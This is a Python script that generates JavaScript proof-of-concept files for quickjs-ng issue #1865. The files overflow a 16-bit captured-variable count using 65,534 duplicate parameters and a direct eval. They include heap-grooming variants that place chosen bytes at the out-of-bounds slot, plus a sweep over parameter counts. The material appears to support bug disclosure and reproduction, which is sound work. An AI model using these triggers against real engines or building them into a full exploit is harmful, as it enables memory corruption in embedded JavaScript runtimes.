#!/usr/bin/env python3
"""Generate the issue #1865 PoCs (quickjs-ng var_ref_count uint16 truncation).

The trick: a sloppy-mode function may declare the same parameter name many
times, and a direct `eval` marks every parameter/local as captured at parse
time (add_eval_variables). 65,534 duplicate params + 5 locals => 65,539
captures, which truncates JSFunctionBytecode.var_ref_count to 3 while the
captured block-scoped `let z` keeps var_ref_idx = 65534.

Usage: python3 gen_poc1865.py [outdir]
"""
import sys, os

N = 65534
OUT = sys.argv[1] if len(sys.argv) > 1 else "."

def params(n=N):
    return ",".join(["x"] * n)

def base():
    return ("// issue #1865: 65,534 duplicate params + direct eval -> var_ref_count wraps\n"
            "function* g(%s){\n"
            "  if (0) eval('');        // parse-time capture of every arg/var\n"
            "  { let z = 1; yield 1; } // OP_close_loc(z) on block exit\n"
            "}\n" % params())

def write(name, text):
    path = os.path.join(OUT, name)
    with open(path, "w") as f:
        f.write(text)
    print(name, len(text))

write("poc1865_dup.js", base() + "var it = g();\nit.next();\nit.next();\n")

write("poc1865_dup_groom.js",
      "var buf = new ArrayBuffer(1024 * 1024);\n"
      "var v = new Uint8Array(buf);\n"
      "v.fill(0x41);              // attacker-chosen 8 bytes at the OOB slot\n" +
      base() + "var it = g();\nit.next();\nit.next();\n")

write("poc1865_dup_groom_zero.js",
      "var buf = new ArrayBuffer(1024 * 1024);\n"
      "var v = new Uint8Array(buf);\n"
      "v.fill(0);                 // NULL slot: close_var_ref returns, engine survives\n" +
      base() + "var it = g();\nit.next();\nit.next();\n")

write("poc1865_dup_1next.js",
      "var buf = new ArrayBuffer(1024 * 1024);\n"
      "var v = new Uint8Array(buf);\nv.fill(0);\n" +
      base() + "var it = g();\nit.next();\n")

# parameter-count sweep: 65531 does not wrap, 65532..65535 crash, >=65536 parse error
for n in range(65528, 65540):
    write("sweep_%d.js" % n, base().replace(params(), params(n)) +
          "var it = g();\nit.next();\nit.next();\n")
